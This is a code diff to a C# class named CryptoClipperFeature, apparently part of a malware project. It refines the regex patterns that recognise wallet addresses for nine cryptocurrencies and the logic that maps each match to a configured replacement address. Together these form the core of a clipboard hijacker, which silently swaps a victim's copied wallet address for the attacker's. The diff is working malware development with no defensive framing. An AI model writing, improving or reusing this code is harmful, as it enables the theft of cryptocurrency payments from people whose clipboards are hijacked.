@@ -21,18 +21,26 @@ internal static class CryptoClipperFeature
     private const uint GMEM_MOVEABLE  = 0x0002;
 
     // ── Regex patterns ─────────────────────────────────────────────────────
+    // Order matters: more specific prefixes first so broad Base58 patterns
+    // (SOL) don't shadow narrower ones (XRP, DASH, TRX).
     private static readonly (string Type, Regex Pattern)[] Patterns =
     [
-        ("BTC",  new Regex(@"^(1|3|bc1)[a-zA-Z0-9]{25,39}$",              RegexOptions.None)),
-        ("ETH",  new Regex(@"^0x[a-fA-F0-9]{40}$",                        RegexOptions.None)),
-        ("BNB",  new Regex(@"^0x[a-fA-F0-9]{40}$",                        RegexOptions.None)),
-        ("LTC",  new Regex(@"^(L|M|3)[a-zA-Z0-9]{26,33}$",               RegexOptions.None)),
-        ("XMR",  new Regex(@"^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$",        RegexOptions.None)),
-        ("SOL",  new Regex(@"^[1-9A-HJ-NP-Za-km-z]{32,44}$",             RegexOptions.None)),
-        ("TRX",  new Regex(@"^T[1-9A-HJ-NP-Za-km-z]{33}$",               RegexOptions.None)),
-        ("XRP",  new Regex(@"^r[0-9a-zA-Z]{24,34}$",                      RegexOptions.None)),
-        ("DASH", new Regex(@"^X[1-9A-HJ-NP-Za-km-z]{33}$",               RegexOptions.None)),
-        ("BCH",  new Regex(@"^(bitcoincash:)?(q|p)[a-z0-9]{41}$",         RegexOptions.None)),
+        // BTC: P2PKH (1…), P2SH (3…), bech32 P2WPKH (bc1q, 42 chars),
+        //      bech32 P2WSH / bech32m P2TR (bc1q/bc1p, 62 chars)
+        ("BTC",     new Regex(@"^((1|3)[a-zA-Z0-9]{25,33}|bc1[a-z0-9]{6,87})$",  RegexOptions.Compiled)),
+        // ETH and BNB share the 0x hex format — indistinguishable by address alone.
+        // One row handles both; GetReplacement tries ETH address first, then BNB.
+        ("ETH/BNB", new Regex(@"^0x[a-fA-F0-9]{40}$",                            RegexOptions.Compiled)),
+        ("LTC",     new Regex(@"^(L|M|3)[a-zA-Z0-9]{26,33}$",                    RegexOptions.Compiled)),
+        ("XMR",     new Regex(@"^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$",             RegexOptions.Compiled)),
+        // Specific-prefix chains before the generic SOL Base58 pattern
+        ("TRX",     new Regex(@"^T[1-9A-HJ-NP-Za-km-z]{33}$",                    RegexOptions.Compiled)),
+        ("XRP",     new Regex(@"^r[0-9a-zA-Z]{24,34}$",                           RegexOptions.Compiled)),
+        ("DASH",    new Regex(@"^X[1-9A-HJ-NP-Za-km-z]{33}$",                    RegexOptions.Compiled)),
+        ("BCH",     new Regex(@"^(bitcoincash:)?(q|p)[a-z0-9]{41}$",              RegexOptions.Compiled)),
+        // SOL: ed25519 public key = always exactly 44 Base58 chars.
+        // Must come last so the generic Base58 pattern doesn't shadow the chains above.
+        ("SOL",     new Regex(@"^[1-9A-HJ-NP-Za-km-z]{44}$",                     RegexOptions.Compiled)),
     ];
 
     // ── State ──────────────────────────────────────────────────────────────
@@ -130,16 +138,17 @@ internal static class CryptoClipperFeature
 
     private static string? GetReplacement(string type) => type switch
     {
-        "BTC"  => _config.BTC,
-        "ETH"  or "BNB" => _config.ETH,
-        "LTC"  => _config.LTC,
-        "XMR"  => _config.XMR,
-        "SOL"  => _config.SOL,
-        "TRX"  => _config.TRX,
-        "XRP"  => _config.XRP,
-        "DASH" => _config.DASH,
-        "BCH"  => _config.BCH,
-        _      => null
+        "BTC"     => _config.BTC,
+        // ETH and BNB share address format; use ETH address if set, BNB address as fallback.
+        "ETH/BNB" => string.IsNullOrEmpty(_config.ETH) ? _config.BNB : _config.ETH,
+        "LTC"     => _config.LTC,
+        "XMR"     => _config.XMR,
+        "SOL"     => _config.SOL,
+        "TRX"     => _config.TRX,
+        "XRP"     => _config.XRP,
+        "DASH"    => _config.DASH,
+        "BCH"     => _config.BCH,
+        _         => null
     };
 
     // ── Clipboard helpers ──────────────────────────────────────────────────
